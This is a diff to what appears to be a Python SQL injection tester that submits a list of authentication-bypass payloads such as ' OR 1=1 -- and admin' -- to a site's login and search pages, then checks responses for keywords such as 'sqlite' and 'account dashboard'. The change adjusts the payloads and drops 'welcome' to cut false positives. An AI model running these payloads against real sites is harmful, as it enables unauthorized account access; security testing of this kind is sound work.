@@ -16,9 +16,9 @@ SEARCH_URL  = f"{BASE_URL}/search"
 # Each entry is: (payload string, description, technique category)
 
 LOGIN_PAYLOADS = [
-    ("' OR '1'='1",          "Classic OR bypass",             "Authentication Bypass"),
-    ("' OR 1=1 --",          "Comment-based bypass",          "Authentication Bypass"),
-    ("' OR 'x'='x",          "String equality bypass",        "Authentication Bypass"),
+    ("' OR 1=1 --",           "Classic OR bypass",             "Authentication Bypass"),
+    ("' OR '1'='1' --",      "Quoted OR bypass",              "Authentication Bypass"),
+    ("' OR 'x'='x' --",      "String equality bypass",        "Authentication Bypass"),
     ("admin' --",            "Admin comment injection",       "Authentication Bypass"),
     ("' OR 1=1#",            "Hash comment bypass",           "Authentication Bypass"),
     ("') OR ('1'='1",        "Parenthesis bypass",            "Authentication Bypass"),
@@ -39,8 +39,10 @@ SEARCH_PAYLOADS = [
 ]
 
 # Keywords in the response body that suggest the injection worked
+# Note: "welcome" is intentionally excluded — the login page says "Welcome Back"
+# which would cause false positives on every failed attempt
 SUCCESS_INDICATORS = [
-    "welcome", "dashboard", "account dashboard",
+    "account dashboard",
     "db error", "database error", "sqlite",
     "syntax error", "no such column",
     "administrator", "manager", "customer",
